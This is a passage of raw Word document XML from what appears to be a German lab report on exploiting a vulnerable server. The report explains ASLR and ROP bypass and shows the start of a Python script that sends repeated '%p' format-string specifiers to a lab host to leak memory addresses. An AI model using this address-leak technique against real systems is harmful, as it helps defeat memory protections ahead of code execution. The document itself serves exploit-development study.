                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="05A50656" w14:textId="2B65EC12" w:rsidR="0088734B" w:rsidRPr="00B47CB9" w:rsidRDefault="0088734B" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="73F12FF7" w14:textId="2D43143F" w:rsidR="008A20C9" w:rsidRPr="00B47CB9" w:rsidRDefault="00A378C9" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Außerdem </w:t>
      </w:r>
      <w:r w:rsidR="008A20C9" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>wurde der Befehl</w:t>
      </w:r>
      <w:r w:rsidR="00B87369">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> „mona modules“</w:t>
      </w:r>
      <w:r w:rsidR="008A20C9" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> zweimal ausgeführt (das zweite Mal nach Neustart</w:t>
      </w:r>
      <w:r w:rsidR="00B87369">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> der Maschine</w:t>
      </w:r>
      <w:r w:rsidR="008A20C9" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>). Wie in den folgenden zwei Abbildungen ersichtlich</w:t>
      </w:r>
      <w:r w:rsidR="00B87369">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> ist</w:t>
      </w:r>
      <w:r w:rsidR="008A20C9" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> sind die Base Adressen der DLLs nicht identisch:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E469E29" w14:textId="262E80D5" w:rsidR="008A20C9" w:rsidRPr="00B47CB9" w:rsidRDefault="008A20C9" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6111419F" w14:textId="6E8A5AE3" w:rsidR="008A20C9" w:rsidRPr="00B47CB9" w:rsidRDefault="008A20C9" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="71ECCA5A" wp14:editId="7151E9FC">
            <wp:extent cx="5759450" cy="1736090"/>
            <wp:effectExtent l="0" t="0" r="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1736090"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CCD977F" w14:textId="77777777" w:rsidR="008A20C9" w:rsidRPr="00B47CB9" w:rsidRDefault="008A20C9" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0FBD82CE" w14:textId="627BC6CF" w:rsidR="00A378C9" w:rsidRPr="00B47CB9" w:rsidRDefault="006E2E15" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="19BA275B" wp14:editId="697256E0">
            <wp:extent cx="5759450" cy="2124710"/>
            <wp:effectExtent l="0" t="0" r="0" b="889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59450" cy="2124710"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="4186E192" w14:textId="3CFBB336" w:rsidR="006E2E15" w:rsidRPr="00B47CB9" w:rsidRDefault="006E2E15" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="15CC611C" w14:textId="5A2DB311" w:rsidR="00DE59A8" w:rsidRPr="00B47CB9" w:rsidRDefault="00DE59A8" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Innerhalb der Aufgabenstellung wurde zuerst versucht eine Methode zu finden, mit welcher man ASLR umgehen kann. </w:t>
      </w:r>
      <w:r w:rsidR="002D4CFF" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Dazu muss man zuerst wissen, was ASLR überhaupt macht. </w:t>
      </w:r>
      <w:r w:rsidR="0060104A" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Bei ASLR (Address Space Layout Randomization) handelt es sich um eine Sicherheitstechnik, </w:t>
      </w:r>
      <w:r w:rsidR="004814CE" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">mit </w:t>
      </w:r>
      <w:r w:rsidR="0060104A" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>welche</w:t>
      </w:r>
      <w:r w:rsidR="0056759B" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">r die </w:t>
      </w:r>
      <w:r w:rsidR="004814CE" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Base Adresse </w:t>
      </w:r>
      <w:r w:rsidR="0056759B" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">einer </w:t>
      </w:r>
      <w:r w:rsidR="004814CE" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Anwendung </w:t>
      </w:r>
      <w:r w:rsidR="0056759B" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>und die Position von Bibliotheken, Heap und Stack zufällig im Adressraum eines Prozesses positioniert werden</w:t>
      </w:r>
      <w:r w:rsidR="007533BD" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:sdt>
        <w:sdtPr>
          <w:rPr>
            <w:lang w:val="de-AT"/>
          </w:rPr>
          <w:alias w:val="Don't edit this field"/>
          <w:tag w:val="CitaviPlaceholder#d6507eaf-228a-425b-a5d8-3d89bd92a72c"/>
          <w:id w:val="-313954718"/>
          <w:placeholder>
            <w:docPart w:val="DefaultPlaceholder_-1854013440"/>
          </w:placeholder>
        </w:sdtPr>
        <w:sdtEndPr/>
        <w:sdtContent>
          <w:r w:rsidR="007533BD" w:rsidRPr="00B47CB9">
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:fldChar w:fldCharType="begin"/>
          </w:r>
          <w:r w:rsidR="003A23EE">
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:instrText>ADDIN CitaviPlaceholder{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}</w:instrText>
          </w:r>
          <w:r w:rsidR="007533BD" w:rsidRPr="00B47CB9">
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:fldChar w:fldCharType="separate"/>
          </w:r>
          <w:r w:rsidR="002F4DA3">
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:t>[8]</w:t>
          </w:r>
          <w:r w:rsidR="007533BD" w:rsidRPr="00B47CB9">
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:fldChar w:fldCharType="end"/>
          </w:r>
        </w:sdtContent>
      </w:sdt>
      <w:r w:rsidR="007533BD" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="0098207D" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> Im Zusammenhang mit DEP ist das</w:t>
      </w:r>
      <w:r w:rsidR="00AE4DB3" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> ein ausgezeichneter Schutzmechanismus, um Exploits schwieriger zu gestalten, da </w:t>
      </w:r>
      <w:r w:rsidR="00742CC9" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">die Adressen der Ropgadgets innerhalb einer Ropchain nicht mehr </w:t>
      </w:r>
      <w:r w:rsidR="00B52200" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>statisch vergeben werden können. Um den</w:t>
      </w:r>
      <w:r w:rsidR="000B7C52" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r w:rsidR="00B52200" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">och </w:t>
      </w:r>
      <w:r w:rsidR="000B7C52" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">einen erfolgreichen Angriff gestalten zu können benötigt man einen Address Leakage. </w:t>
      </w:r>
      <w:r w:rsidR="001F187E" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>D</w:t>
      </w:r>
      <w:r w:rsidR="00116701" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">iese </w:t>
      </w:r>
      <w:r w:rsidR="00E11F15" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">können mit einer Format String Schwachstelle ermittelt werden. Eine Beispielimplemtierung wäre eine </w:t>
      </w:r>
      <w:r w:rsidR="00D42DFE" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">unsicher gestaltete printf Funktion, welche Userinput entgegennimmt. </w:t>
      </w:r>
      <w:r w:rsidR="00036E04" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Mit Übergabe des Parameters „%p“ erhält man </w:t>
      </w:r>
      <w:r w:rsidR="009B3F19" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>als Output eine externe Darstellung eines Pointers auf void.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FFCFFD7" w14:textId="3615385B" w:rsidR="00CE21D9" w:rsidRPr="00B47CB9" w:rsidRDefault="00CE21D9" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6F0122DB" w14:textId="3BD32897" w:rsidR="00345958" w:rsidRPr="00B47CB9" w:rsidRDefault="00345958" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Nach kurzer Recherche konnte ermittelt werden, dass dies </w:t>
      </w:r>
      <w:r w:rsidR="009B29B6" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>bei der Änderung des Board Topics in der Anwendung der Fall ist</w:t>
      </w:r>
      <w:r w:rsidR="0045340D" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> (siehe Abbildung)</w:t>
      </w:r>
      <w:r w:rsidR="009B29B6" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="253C3436" w14:textId="1DC18E67" w:rsidR="00CE21D9" w:rsidRPr="00B47CB9" w:rsidRDefault="00345958" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2580BF1D" wp14:editId="022475F0">
            <wp:extent cx="2886502" cy="2756934"/>
            <wp:effectExtent l="0" t="0" r="9525" b="5715"/>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2900637" cy="2770435"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="04546A84" w14:textId="4BCD35EE" w:rsidR="00DE59A8" w:rsidRPr="00B47CB9" w:rsidRDefault="00DE59A8" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="23EB3FFA" w14:textId="2CC7EBD9" w:rsidR="00195E44" w:rsidRPr="00B47CB9" w:rsidRDefault="00796B01" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Daraufhin wurde mit Pyhton eine Anwendung entwickelt, welche </w:t>
      </w:r>
      <w:r w:rsidR="00195E44" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>uns die geleakten Adressen in eine Textdatei speichert.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CAFA4F3" w14:textId="4957ABD5" w:rsidR="00195E44" w:rsidRPr="00B47CB9" w:rsidRDefault="00195E44" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="Tabellenraster"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="9060"/>
      </w:tblGrid>
      <w:tr w:rsidR="00195E44" w:rsidRPr="00B47CB9" w14:paraId="471D6DA1" w14:textId="77777777" w:rsidTr="00195E44">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9060" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="043C5815" w14:textId="77777777" w:rsidR="00195E44" w:rsidRPr="004D58C1" w:rsidRDefault="00195E44" w:rsidP="00195E44">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>#!/usr/bin/python</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1A0BD84D" w14:textId="77777777" w:rsidR="00195E44" w:rsidRPr="004D58C1" w:rsidRDefault="00195E44" w:rsidP="00195E44">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>import socket</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5375BE10" w14:textId="77777777" w:rsidR="00195E44" w:rsidRPr="004D58C1" w:rsidRDefault="00195E44" w:rsidP="00195E44">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="67095F93" w14:textId="77777777" w:rsidR="00195E44" w:rsidRPr="004D58C1" w:rsidRDefault="00195E44" w:rsidP="00195E44">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="6DA47C97" w14:textId="77777777" w:rsidR="00195E44" w:rsidRPr="004D58C1" w:rsidRDefault="00195E44" w:rsidP="00195E44">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>def leakedAddresses():</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5A4CA62A" w14:textId="77777777" w:rsidR="00195E44" w:rsidRPr="004D58C1" w:rsidRDefault="00195E44" w:rsidP="00195E44">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    numberOfChars = 172</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="498F7618" w14:textId="77777777" w:rsidR="00195E44" w:rsidRPr="004D58C1" w:rsidRDefault="00195E44" w:rsidP="00195E44">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    char = b"%p&gt;"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1FB25295" w14:textId="77777777" w:rsidR="00195E44" w:rsidRPr="004D58C1" w:rsidRDefault="00195E44" w:rsidP="00195E44">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    buffer = char * numberOfChars</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="656D8B32" w14:textId="77777777" w:rsidR="00195E44" w:rsidRPr="004D58C1" w:rsidRDefault="00195E44" w:rsidP="00195E44">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    fileName = 'leaked_adresses_1.txt'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3681FBDE" w14:textId="77777777" w:rsidR="00195E44" w:rsidRPr="004D58C1" w:rsidRDefault="00195E44" w:rsidP="00195E44">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="33A85368" w14:textId="77777777" w:rsidR="00195E44" w:rsidRPr="004D58C1" w:rsidRDefault="00195E44" w:rsidP="00195E44">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    startLenght = 20</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5B949BDD" w14:textId="77777777" w:rsidR="00195E44" w:rsidRPr="004D58C1" w:rsidRDefault="00195E44" w:rsidP="00195E44">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    bufferLenght = numberOfChars * 9 + startLenght</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6F2C5A61" w14:textId="77777777" w:rsidR="00195E44" w:rsidRPr="004D58C1" w:rsidRDefault="00195E44" w:rsidP="00195E44">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="13942710" w14:textId="77777777" w:rsidR="00195E44" w:rsidRPr="004D58C1" w:rsidRDefault="00195E44" w:rsidP="00195E44">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    connect=s.connect(('10.0.2.12', 4444)) # hardcoded IP address</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="35AB52FA" w14:textId="77777777" w:rsidR="00195E44" w:rsidRPr="004D58C1" w:rsidRDefault="00195E44" w:rsidP="00195E44">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    s.recv(1024)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="089B0336" w14:textId="77777777" w:rsidR="00195E44" w:rsidRPr="004D58C1" w:rsidRDefault="00195E44" w:rsidP="00195E44">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    s.send(bytes('C \r\n', 'utf-8'))</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3DD6DF8C" w14:textId="77777777" w:rsidR="00195E44" w:rsidRPr="004D58C1" w:rsidRDefault="00195E44" w:rsidP="00195E44">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    s.recv(1024)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="774AC8C9" w14:textId="77777777" w:rsidR="00195E44" w:rsidRPr="004D58C1" w:rsidRDefault="00195E44" w:rsidP="00195E44">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    s.send(buffer + bytes('\r\n', 'utf-8'))</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0B05B970" w14:textId="77777777" w:rsidR="00195E44" w:rsidRPr="004D58C1" w:rsidRDefault="00195E44" w:rsidP="00195E44">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    data = b""</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="75A7BF3F" w14:textId="77777777" w:rsidR="00195E44" w:rsidRPr="004D58C1" w:rsidRDefault="00195E44" w:rsidP="00195E44">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="3F60D19E" w14:textId="77777777" w:rsidR="00195E44" w:rsidRPr="004D58C1" w:rsidRDefault="00195E44" w:rsidP="00195E44">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    while(len(data)&lt;bufferLenght):</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="00566C73" w14:textId="77777777" w:rsidR="00195E44" w:rsidRPr="004D58C1" w:rsidRDefault="00195E44" w:rsidP="00195E44">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">        data += s.recv(bufferLenght)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0E8B2749" w14:textId="77777777" w:rsidR="00195E44" w:rsidRPr="004D58C1" w:rsidRDefault="00195E44" w:rsidP="00195E44">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="0B6ED525" w14:textId="77777777" w:rsidR="00195E44" w:rsidRPr="004D58C1" w:rsidRDefault="00195E44" w:rsidP="00195E44">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    s.send(bytes('n\r\n', 'utf-8')) # evil buffer</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="35F3A213" w14:textId="77777777" w:rsidR="00195E44" w:rsidRPr="004D58C1" w:rsidRDefault="00195E44" w:rsidP="00195E44">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    s.close()</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5E9D7053" w14:textId="77777777" w:rsidR="00195E44" w:rsidRPr="004D58C1" w:rsidRDefault="00195E44" w:rsidP="00195E44">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="58EAFFC2" w14:textId="77777777" w:rsidR="00195E44" w:rsidRPr="004D58C1" w:rsidRDefault="00195E44" w:rsidP="00195E44">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    # remove unnecessary line which are send by the server</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4A62ACFD" w14:textId="77777777" w:rsidR="00195E44" w:rsidRPr="004D58C1" w:rsidRDefault="00195E44" w:rsidP="00195E44">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    string = data.decode("utf-8")</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="469334E2" w14:textId="77777777" w:rsidR="00195E44" w:rsidRPr="004D58C1" w:rsidRDefault="00195E44" w:rsidP="00195E44">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    string = string.replace("Neuer Topic: ", "")</w:t>
            </w:r>
          </w:p>
